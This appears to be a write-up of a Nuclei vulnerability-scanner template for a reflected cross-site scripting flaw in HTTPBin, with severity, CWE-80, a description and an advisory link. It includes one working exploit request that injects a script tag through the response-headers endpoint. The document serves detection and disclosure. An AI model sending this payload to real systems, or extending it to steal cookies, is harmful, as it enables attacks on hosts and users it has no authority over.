# Nuclei Template: HTTPBin - Cross-Site Scripting
**Template ID:** httpbin-contenttype-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`httpbin-contenttype-xss.yaml`)

## Vulnerability Information & PoC

## Description
HTTPBin contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/response-headers?Content-Type=text/html&Server=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://github.com/mccutchen/go-httpbin/security/advisories/GHSA-528q-4pgm-wvg2
